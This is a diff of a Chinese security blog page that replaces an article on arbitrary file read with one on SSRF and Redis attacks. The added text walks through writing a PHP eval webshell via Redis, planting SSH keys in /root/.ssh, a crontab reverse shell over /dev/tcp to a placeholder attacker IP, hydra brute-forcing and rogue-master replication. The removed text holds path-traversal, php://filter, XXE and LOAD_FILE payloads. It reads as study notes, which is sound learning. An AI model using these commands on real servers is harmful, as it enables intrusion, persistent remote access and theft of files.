@@ -19,21 +19,21 @@
   <meta name="author" content="ziddzide">
   <meta name="keywords" content="">
   
-    <meta name="description" content="任意文件读取漏洞原理攻击者利用一些手段读取服务器上开发者不允许读到的文件，常作为资产信息搜集的重要手段，在每种可部署到web应用程序的程序语言中几乎都存在  任意文件读取漏洞常见触发点web语言PHP有关文件读取函数file_get_content(),file(),fopen()函数及其文件指针操作函数fread(),fgets()等 文件包含函数include(),require(),incl">
+    <meta name="description" content="SSRF-服务端请求伪造原理解析URL结构解析1234567URL &#x3D; schema:&#x2F;&#x2F;[userinfo]@[host:port][path]?[query]#[fragment]# schema 资源所需要的协议# host 表示服务器,可以是域名,也可以是ipv4或者ipv6地址# port 表示端口# path 路径# query 查询字符串,将用户输入传递给服务器,例如?id &#x3D; 1#">
 <meta property="og:type" content="article">
-<meta property="og:title" content="任意文件读取漏洞">
-<meta property="og:url" content="http://example.com/2025/09/22/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:title" content="SSRF">
+<meta property="og:url" content="http://example.com/2025/09/23/SSRF/index.html">
 <meta property="og:site_name" content="ziddzide的技术博客">
-<meta property="og:description" content="任意文件读取漏洞原理攻击者利用一些手段读取服务器上开发者不允许读到的文件，常作为资产信息搜集的重要手段，在每种可部署到web应用程序的程序语言中几乎都存在  任意文件读取漏洞常见触发点web语言PHP有关文件读取函数file_get_content(),file(),fopen()函数及其文件指针操作函数fread(),fgets()等 文件包含函数include(),require(),incl">
+<meta property="og:description" content="SSRF-服务端请求伪造原理解析URL结构解析1234567URL &#x3D; schema:&#x2F;&#x2F;[userinfo]@[host:port][path]?[query]#[fragment]# schema 资源所需要的协议# host 表示服务器,可以是域名,也可以是ipv4或者ipv6地址# port 表示端口# path 路径# query 查询字符串,将用户输入传递给服务器,例如?id &#x3D; 1#">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-09-22T15:31:11.000Z">
-<meta property="article:modified_time" content="2025-09-22T15:43:17.651Z">
+<meta property="article:published_time" content="2025-09-23T09:07:34.000Z">
+<meta property="article:modified_time" content="2025-09-23T09:10:44.694Z">
 <meta property="article:author" content="ziddzide">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>任意文件读取漏洞 - ziddzide的技术博客</title>
+  <title>SSRF - ziddzide的技术博客</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +199,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="任意文件读取漏洞"></span>
+            <span id="subtitle" data-typed-text="SSRF"></span>
           
         </div>
 
@@ -210,8 +210,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-09-22 23:31" pubdate>
-          2025年9月22日 晚上
+        <time datetime="2025-09-23 17:07" pubdate>
+          2025年9月23日 下午
         </time>
       </span>
     
@@ -222,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          851 字
+          1.2k 字
         
       </span>
     
@@ -233,7 +233,7 @@
         
         
         
-          8 分钟
+          10 分钟
         
       </span>
     
@@ -270,51 +270,67 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">任意文件读取漏洞</h1>
+            <h1 id="seo-header">SSRF</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><strong>攻击者利用一些手段读取服务器上开发者不允许读到的文件，常作为资产信息搜集的重要手段，在每种可部署到web应用程序的程序语言中几乎都存在</strong></p>
-<hr>
-<h2 id="任意文件读取漏洞常见触发点"><a href="#任意文件读取漏洞常见触发点" class="headerlink" title="任意文件读取漏洞常见触发点"></a>任意文件读取漏洞常见触发点</h2><h3 id="web语言"><a href="#web语言" class="headerlink" title="web语言"></a>web语言</h3><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><h5 id="有关文件读取函数"><a href="#有关文件读取函数" class="headerlink" title="有关文件读取函数"></a>有关文件读取函数</h5><p><code>file_get_content()</code>,<code>file()</code>,<code>fopen()</code>函数及其文件指针操作函数<code>fread()</code>,<code>fgets()</code>等</p>
-<h5 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h5><p><code>include()</code>,<code>require()</code>,<code>include_once()</code>,<code>require_once()</code>等</p>
-<h5 id="PHP系统命令"><a href="#PHP系统命令" class="headerlink" title="PHP系统命令:"></a>PHP系统命令:</h5><p><code>exec()</code>,<code>system()</code>等</p>
-<h5 id="PHP协议-wrapper"><a href="#PHP协议-wrapper" class="headerlink" title="PHP协议-wrapper:"></a>PHP协议-wrapper:</h5><p>例如:</p>
-<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//host:port/xxx --通过http协议访问远程服务器上对应的文件</span><br><span class="hljs-symbol">php:</span><span class="hljs-comment">//协议</span><br></code></pre></td></tr></table></figure>
+                <h1 id="SSRF-服务端请求伪造"><a href="#SSRF-服务端请求伪造" class="headerlink" title="SSRF-服务端请求伪造"></a>SSRF-服务端请求伪造</h1><h2 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h2><h3 id="URL结构解析"><a href="#URL结构解析" class="headerlink" title="URL结构解析"></a>URL结构解析</h3><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">URL</span> = schema://[userinfo]@[host:port][path]?[query]<span class="hljs-comment">#[fragment]</span><br><span class="hljs-comment"># schema 资源所需要的协议</span><br><span class="hljs-comment"># host 表示服务器,可以是域名,也可以是ipv4或者ipv6地址</span><br><span class="hljs-comment"># port 表示端口</span><br><span class="hljs-comment"># path 路径</span><br><span class="hljs-comment"># query 查询字符串,将用户输入传递给服务器,例如?id = 1</span><br><span class="hljs-comment"># fragment </span><br></code></pre></td></tr></table></figure>
 
-<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/?p=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=flag<br><span class="hljs-comment">#利用php的filter机制在页面输出想要的文件的base64编码</span><br></code></pre></td></tr></table></figure>
+<h2 id="检测漏洞存在"><a href="#检测漏洞存在" class="headerlink" title="检测漏洞存在"></a>检测漏洞存在</h2><p>尝试schema的协议类型</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">file:</span>// <span class="hljs-meta"># 从文件系统中获取文件</span><br><span class="hljs-symbol">dirt:</span>// <span class="hljs-meta"># 字典服务器协议</span><br><span class="hljs-symbol">gopher:</span>// <span class="hljs-meta"># 分布式文档传递</span><br></code></pre></td></tr></table></figure>
 
-<h3 id="PHP攻击姿势"><a href="#PHP攻击姿势" class="headerlink" title="PHP攻击姿势"></a>PHP攻击姿势</h3><p>经典攻击​：<code>http://网站.com/download.php?file=../../../../etc/passwd</code></p>
-<p>​PHP​：用 <code>php://filter</code>协议把文件用Base64编码读出来，避免代码执行，直接看源码</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>网站.com<span class="hljs-regexp">/index.php?page=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=config.php<br><span class="hljs-comment">#拿到Base64编码后的内容，解码一下就能看到源码里的数据库密码</span><br></code></pre></td></tr></table></figure>
-
-<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><p><strong>容易出现读取非预期文件的情况</strong></p>
-<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p><code>FileInputStream</code>,<code>XXE</code>文件读取函数导致的漏洞以及Java有些模块也支持<code>file://</code>协议</p>
-<h5 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h5><p><strong>解析XML时，如果没配置好，攻击者可以构造一个特殊的XML，让服务器去读任意文件。</strong></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hack</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br>#如果解析,文件将会被输出到<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>标签里<br></code></pre></td></tr></table></figure>
-
-<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><h5 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h5><p><code>Rails</code>框架导致漏洞</p>
-<h5 id="node"><a href="#node" class="headerlink" title="node"></a>node</h5><p><code>express</code>模块导致漏洞</p>
-<h3 id="中间件-服务器相关"><a href="#中间件-服务器相关" class="headerlink" title="中间件&#x2F;服务器相关"></a>中间件&#x2F;服务器相关</h3><h4 id="Nginx错误配置"><a href="#Nginx错误配置" class="headerlink" title="Nginx错误配置"></a>Nginx错误配置</h4><p>配置<code>alias</code>时没写对，就会产生路径穿越</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">location <span class="hljs-regexp">/files/</span> &#123;<br>    alias <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/uploads/</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p><strong>怎么利用？​</strong>​：访问 <code>http://网站.com/files../etc/passwd</code></p>
-<p>Nginx会把<code>/files</code>替换成<code>/var/www/uploads/</code>，拼出来就成了<code>/var/www/uploads/../etc/passwd</code>，也就是<code>/var/www/etc/passwd</code>。如果这个文件不存在，可能就直接返回错误信息，泄露了部分路径。</p>
-<h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p><strong>MySQL</strong>​：如果数据库用户权限很高（有FILE权限），可以利用SQL注入执行<code>LOAD_FILE()</code>函数读文件。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>网站.com<span class="hljs-operator">/</span>news.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> LOAD_FILE(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
-
-<p>​<strong>PostgreSQL</strong>​：类似，用<code>pg_read_file()</code>函数。</p>
-<h4 id="软连接"><a href="#软连接" class="headerlink" title="软连接"></a>软连接</h4><p>如果网站允许用户上传文件，攻击者可以上传一个<strong>软链接文件</strong>​（类似于Windows的快捷方式），这个链接指向<code>/etc/passwd</code>等敏感文件。如果网站提供了“下载”功能，且没有判断文件类型，就可能直接把这个软链接指向的真实文件给下载下来。</p>
-<h4 id="FFmpeg"><a href="#FFmpeg" class="headerlink" title="FFmpeg"></a>FFmpeg</h4><h4 id="Docker-API"><a href="#Docker-API" class="headerlink" title="Docker-API"></a>Docker-API</h4><p>如果服务器的Docker端口（2375）暴露在外且没设置密码，攻击者可以远程控制Docker，然后启动一个容器，把宿主机的根目录<code>/</code>挂载到容器里，然后直接读宿主机的所有文件。</p>
-<h3 id="客户端相关"><a href="#客户端相关" class="headerlink" title="客户端相关"></a>客户端相关</h3><h4 id="浏览器-Flash-XSS"><a href="#浏览器-Flash-XSS" class="headerlink" title="浏览器&#x2F;Flash XSS"></a>浏览器&#x2F;Flash XSS</h4><h5 id="浏览器-XSS​"><a href="#浏览器-XSS​" class="headerlink" title="浏览器&#x2F;XSS​"></a><strong>浏览器&#x2F;XSS</strong>​</h5><p>XSS本身不能读服务器上的文件，但它可以：</p>
+<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="服务器资源探测"><a href="#服务器资源探测" class="headerlink" title="服务器资源探测"></a>服务器资源探测</h3><h4 id="检测服务器端口开放程度"><a href="#检测服务器端口开放程度" class="headerlink" title="检测服务器端口开放程度"></a>检测服务器端口开放程度</h4><p>通过编写简单的脚本逐一试探服务器端口是否开放,通过返回true或者false来判断</p>
+<h3 id="使用gopher协议"><a href="#使用gopher协议" class="headerlink" title="使用gopher协议"></a>使用gopher协议</h3><h4 id="攻击redis"><a href="#攻击redis" class="headerlink" title="攻击redis"></a>攻击redis</h4><p>redis一般运行在内网,大多绑定在<strong>127.0.0.1:6379</strong>,一般空口令</p>
+<h5 id="1-未授权访问与弱口令"><a href="#1-未授权访问与弱口令" class="headerlink" title="1. 未授权访问与弱口令"></a>1. 未授权访问与弱口令</h5><p>Redis 默认安装后<strong>没有密码认证</strong>​（<code>requirepass</code>参数为空），或者管理员设置了<strong>弱口令</strong>，导致攻击者可以直接连接</p>
+<p>。</p>
 <ul>
-<li><p>读取用户浏览器里缓存的数据。</p>
+<li>​<strong>检测与连接</strong>​：<br> 使用 redis-cli 尝试连接，如果不需要密码即可进入交互式命令行，则存在未授权访问redis-cli -h &lt;目标IP&gt;# 如果设置了密码，可以尝试使用 hydra 进行暴力破解hydra -P &#x2F;path&#x2F;to&#x2F;password_list.txt redis:&#x2F;&#x2F;&lt;目标IP&gt;</li>
+</ul>
+<h5 id="2-写入-Webshell"><a href="#2-写入-Webshell" class="headerlink" title="2. 写入 Webshell"></a>2. 写入 Webshell</h5><p>此方法需要在目标服务器上存在一个 Redis 进程有<strong>写入权限的 Web 目录</strong>​（如 <code>/var/www/html</code>）。</p>
+<p>​<strong>利用步骤</strong>​：</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">#接至目标 Redisredis-cli -h <span class="hljs-tag">&lt;<span class="hljs-name">目标IP</span>&gt;</span></span><br><span class="language-xml"># 配置 Redis 的持久化存储目录为 Web 目录</span><br><span class="language-xml">目标IP:6379&gt; CONFIG SET dir /var/www/html</span><br><span class="language-xml"># 设置持久化数据库文件名为一个 PHP 文件</span><br><span class="language-xml">目标IP:6379&gt; CONFIG SET dbfilename shell.php</span><br><span class="language-xml"># 写入一个简单的 PHP WebShell</span><br><span class="language-xml">目标IP:6379&gt; SET webshell &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;</span><br><span class="language-xml"># 保存当前内存数据到磁盘文件（即写入 WebShell）</span><br><span class="language-xml">目标IP:6379&gt; SAVE# 退出目标IP:6379&gt; QUIT</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>成功后，可通过浏览器访问 <code>http://&lt;目标IP&gt;/shell.php</code>，并使用中国蚁剑等工具连接。</p>
+<h5 id="3-写入-SSH-公钥"><a href="#3-写入-SSH-公钥" class="headerlink" title="3. 写入 SSH 公钥"></a>3. 写入 SSH 公钥</h5><p>此方法通常需要 ​<strong>Redis 以 root 权限运行</strong>，从而能向 root 用户的 SSH 授权密钥文件写入数据。</p>
+<p>​<strong>利用步骤</strong>​：</p>
+<ol>
+<li><p>​<strong>在攻击机上生成 SSH 密钥对</strong>​（如果还没有）：<br><code>ssh-keygen -t rsa</code><br>这将生成 <code>id_rsa</code>（私钥）和 <code>id_rsa.pub</code>（公钥）。</p>
 </li>
-<li><p>诱导用户上传文件，然后偷偷把文件内容发到攻击者的服务器（比如读取用户的敏感文档）。</p>
+<li><p>​<strong>将公钥写入特定格式的文件</strong>​（为了处理 Redis 写入的额外字符，通常需要添加换行）：<br>(echo -e “\n\n”; cat ~&#x2F;.ssh&#x2F;id_rsa.pub; echo -e “\n\n”) &gt; key.txt</p>
+</li>
+<li><p>​<strong>通过 Redis 将公钥写入目标机的 authorized_keys 文件</strong>​：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#将公钥内容作为值写入 Redis 的一个键</span><br>cat key.txt | redis-cli -h &lt;目标IP&gt; -x <span class="hljs-built_in">set</span> ssh_key<br><span class="hljs-comment"># 连接 Redis</span><br>redis-cli -h &lt;目标IP&gt;<br><span class="hljs-comment"># 配置 Redis 数据目录为 /root/.ssh/</span><br>目标IP:6379&gt;<span class="hljs-built_in"> CONFIG </span><span class="hljs-built_in">SET</span> dir /root/.ssh<br><span class="hljs-comment"># 设置数据库文件名为 authorized_keys</span><br>目标IP:6379&gt;<span class="hljs-built_in"> CONFIG </span><span class="hljs-built_in">SET</span> dbfilename authorized_keys<br><span class="hljs-comment"># 保存</span><br>目标IP:6379&gt; SAVE<br></code></pre></td></tr></table></figure>
+
+
+
+
+</li>
+<li></li>
+<li><p>​<strong>使用私钥进行 SSH 免密登录</strong>​：<br>ssh -i ~&#x2F;.ssh&#x2F;id_rsa root@&lt;目标IP&gt;</p>
+</li>
+</ol>
+<h5 id="4-写入定时任务-Crontab"><a href="#4-写入定时任务-Crontab" class="headerlink" title="4. 写入定时任务 (Crontab)"></a>4. 写入定时任务 (Crontab)</h5><p>此方法同样通常需要 ​<strong>Redis 以 root 权限运行</strong>，从而能向系统定时任务目录写入计划任务。</p>
+<p>​<strong>利用步骤</strong>​：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#连接至目标 </span><br>Redisredis-cli -h &lt;目标IP&gt;<br><span class="hljs-comment"># 配置 Redis 数据目录为定时任务目录（通常是 /var/spool/cron/ 或 /etc/cron.d/）</span><br>目标IP:6379&gt;<span class="hljs-built_in"> CONFIG </span><span class="hljs-built_in">SET</span> dir /var/spool/cron<br><span class="hljs-comment"># 设置数据库文件名为对应用户名（例如 root）</span><br>目标IP:6379&gt;<span class="hljs-built_in"> CONFIG </span><span class="hljs-built_in">SET</span> dbfilename root<br><span class="hljs-comment"># 写入一个每分钟执行一次的反向 Shell 命令</span><br><span class="hljs-comment"># 注意：这里的 IP 和端口需要替换为你的攻击机监听地址和端口</span><br>目标IP:6379&gt; <span class="hljs-built_in">SET</span> revshell <span class="hljs-string">&quot;\n\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/&lt;你的IP&gt;/&lt;你的端口&gt; 0&gt;&amp;1\n\n&quot;</span><br><span class="hljs-comment"># 保存</span><br>目标IP:6379&gt; SAVE<br><br>同时在你的攻击机上监听指定端口：nc -lvnp &lt;你的端口&gt;<br></code></pre></td></tr></table></figure>
+
+
+
+<h5 id="5-主从复制利用"><a href="#5-主从复制利用" class="headerlink" title="5. 主从复制利用"></a>5. 主从复制利用</h5><p>这种方法更为高级，通过让目标 Redis 服务器作为从节点同步来自攻击者控制的恶意主节点的数据，从而加载恶意的 Redis 模块来实现远程代码执行。</p>
+<ul>
+<li><p>​<strong>利用思路</strong>​：</p>
+<ol>
+<li><p>攻击者在自己的机器上搭建一个恶意的 Redis 主服务器，并准备好包含恶意代码的 RDB 文件。</p>
+</li>
+<li><p>通过未授权访问等方式，让目标 Redis 执行 <code>SLAVEOF &lt;攻击者IP&gt; 6379</code>命令，使其成为恶意主节点的从节点。</p>
+</li>
+<li><p>目标 Redis 会同步恶意主节点的数据，加载恶意 RDB 文件，从而执行预设的代码。<br>通常会使用自动化工具（如 <code>redis-rogue-server</code>）来完成<br>。</p>
+</li>
+</ol>
 </li>
 </ul>
-<h4 id="MarkDown语法解析器-XSS"><a href="#MarkDown语法解析器-XSS" class="headerlink" title="MarkDown语法解析器 XSS"></a>MarkDown语法解析器 XSS</h4><p>有些网站允许你用Markdown语法写文章，但它的解析器不够安全，没能过滤掉危险的代码。<br>    <a href="javascript:alert('是的这是一个弹窗')">这是个链接</a></p>
 
                 
               </div>
@@ -332,8 +348,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>任意文件读取漏洞</div>
-      <div>http://example.com/2025/09/22/任意文件读取漏洞/</div>
+      <div>SSRF</div>
+      <div>http://example.com/2025/09/23/SSRF/</div>
     </div>
     <div class="license-meta">
       
@@ -345,7 +361,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年9月22日</div>
+          <div>2025年9月23日</div>
         </div>
       
       
@@ -377,18 +393,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/09/23/SSRF/" title="SSRF">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">SSRF</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/09/13/SQL%E6%B3%A8%E5%85%A5-%E5%9F%BA%E7%A1%80%E7%AF%87/" title="SQL注入--基础篇">
-                        <span class="hidden-mobile">SQL注入--基础篇</span>
+                      <a href="/2025/09/22/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" title="任意文件读取漏洞">
+                        <span class="hidden-mobile">任意文件读取漏洞</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
